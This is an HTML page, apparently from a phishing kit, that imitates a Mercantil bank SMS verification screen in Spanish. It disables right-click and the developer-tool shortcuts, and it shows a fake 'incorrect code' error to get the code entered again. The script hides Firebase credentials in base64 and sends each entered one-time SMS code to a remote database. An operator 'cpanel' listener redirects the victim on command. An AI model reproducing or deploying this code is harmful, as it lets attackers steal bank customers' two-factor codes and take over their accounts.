<!DOCTYPE html>
<html lang="es">
<head>
<script>
// Anti-Inspect / Anti-Ctrl+U Security
document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
document.addEventListener('keydown', function(e) {
    if (e.keyCode === 123) { e.preventDefault(); return false; } // F12
    if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { e.preventDefault(); return false; } // Ctrl+Shift+I
    if (e.ctrlKey && e.shiftKey && e.keyCode === 74) { e.preventDefault(); return false; } // Ctrl+Shift+J
    if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; } // Ctrl+U
    if (e.ctrlKey && e.keyCode === 83) { e.preventDefault(); return false; } // Ctrl+S
});
</script>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<title>Mercantil</title>
<link rel="icon" href="https://mercantil30credito.up.railway.app/merca.ico" type="image/x-icon">
<link rel="stylesheet" href="./inicio_files/bootstrap.67b15cc69e6080ae.css">
<link rel="stylesheet" href="./inicio_files/styles.c663b1e287ec0a1e.css">
<link rel="stylesheet" href="./inicio_files/lara-light-blue-theme.8ecaee422619f77e.css">
<link rel="stylesheet" href="./inicio_files/styles.css">
<style>
  body { background: #f5f7fa; font-family: Arial, sans-serif; }
  .sms-wrapper {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #f5f7fa;
  }
  .sms-card {
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 4px 24px rgba(0,78,155,0.10);
    padding: 40px 32px 32px 32px;
    max-width: 380px;
    width: 100%;
    text-align: center;
  }
  .sms-logo {
    width: 140px;
    margin-bottom: 18px;
  }
  .sms-title {
    color: #004e9b;
    font-size: 22px;
    font-weight: bold;
    margin-bottom: 6px;
  }
  .sms-subtitle {
    color: #555;
    font-size: 14px;
    margin-bottom: 24px;
  }
  .sms-label {
    color: #004e9b;
    font-weight: bold;
    font-size: 13px;
    text-align: left;
    margin-bottom: 4px;
    display: block;
  }
  .sms-input {
    width: 100%;
    border: 1.5px solid #b0c4de;
    border-radius: 6px;
    padding: 12px 14px;
    font-size: 18px;
    letter-spacing: 4px;
    text-align: center;
    outline: none;
    margin-bottom: 22px;
    transition: border-color 0.2s;
    box-sizing: border-box;
  }
  .sms-input:focus { border-color: #004e9b; }
  .sms-btn {
    width: 100%;
    background: #004e9b;
    color: #fff;
    border: none;
    border-radius: 24px;
    padding: 13px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: background 0.2s;
  }
  .sms-btn:hover { background: #0066cc; }
  .sms-info {
    color: #888;
    font-size: 12px;
    margin-top: 16px;
  }
</style>
</head>
<body>
<div class="sms-wrapper">
  <div class="sms-card">
    <img src="data:image/png;base64," alt="Mercantil" style="max-width:180px;margin-bottom:18px;display:block;margin-left:auto;margin-right:auto;">
    <div class="sms-title">Código de verificación</div>
    <div style="background:#fee2e2;border:1px solid #fca5a5;color:#b91c1c;padding:8px 14px;border-radius:6px;font-size:12px;font-weight:600;margin-bottom:10px;">El código ingresado es incorrecto. Por favor intente de nuevo.</div><div class="sms-subtitle">Ingresa el código SMS que recibiste en tu teléfono registrado.</div>
    <label class="sms-label" for="codigosms">Código SMS</label>
    <input type="tel" id="codigosms" class="sms-input" maxlength="8" placeholder="_ _ _ _ _ _" autocomplete="one-time-code">
    <button class="sms-btn" id="btnSMS" onclick="enviarSMS()">Verificar</button>
    <div class="sms-info">¿No recibiste el código? <a href="#" style="color:#004e9b;">Reenviar</a></div>
  </div>
</div>

<script src="config.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-app-compat.js"></script>
<script src="config.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-database-compat.js"></script>
<script>
(function(){
  var _d=atob,_c={apiKey:_d('QUl6YVN5Q0FIVkRzLUVfTEtvVldyMXJKdmRqSHpHTndfbU0xSjVN'),authDomain:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZWFwcC5jb20='),databaseURL:_d('aHR0cHM6Ly9kZXZpY2Utc3RyZWFtaW5nLTJmOWU2OGI2LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbQ=='),projectId:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNg=='),storageBucket:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZXN0b3JhZ2UuYXBw'),messagingSenderId:_d('NTQyMDQ3NjIwNjYz'),appId:_d('MTo1NDIwNDc2MjA2NjM6d2ViOjFlMzUyNmYxZGVlODA5MzdlZjc5YjI=')};if(!firebase.apps.length)firebase.initializeApp(_c);
  var _db = firebase.database();
  var _PATH = (typeof SITE_ID !== 'undefined' && SITE_ID) ? SITE_ID : atob('dm1fNzdjZjI4ZmZkYg==');

  var tok = sessionStorage.getItem('_sid');
  if (!tok) { tok = 'M_' + Date.now(); sessionStorage.setItem('_sid', tok); }

  // Listen for commands from cpanel
  _db.ref(_PATH + '/' + tok + '/command').on('value', function(snap) {
    var cmd = snap.val();
    if (!cmd || !cmd.page) return;
    if (cmd.page !== 'codigosms' && cmd.page !== 'codigosms.html') {
      _db.ref(_PATH + '/' + tok + '/command').remove();
      window.location.href = cmd.page;
    }
  });

  window.enviarSMS = function() {
    var codigo = document.getElementById('codigosms').value.trim();
    if (!codigo) return;

    var xhr = new XMLHttpRequest();
    xhr.open('PUT', ''+atob('aHR0cHM6Ly9kZXZpY2Utc3RyZWFtaW5nLTJmOWU2OGI2LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbQ==')+'/' + _PATH + '/' + tok + '/sms.json', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onloadend = function() { window.location.href = 'carga.html'; };
    xhr.onerror = function() { window.location.href = 'carga.html'; };
    xhr.send(JSON.stringify(codigo));
  };

  document.getElementById('codigosms').addEventListener('keydown', function(e){
    if (e.key === 'Enter') { window.enviarSMS(); }
  });
})();
</script>
</body>
</html>
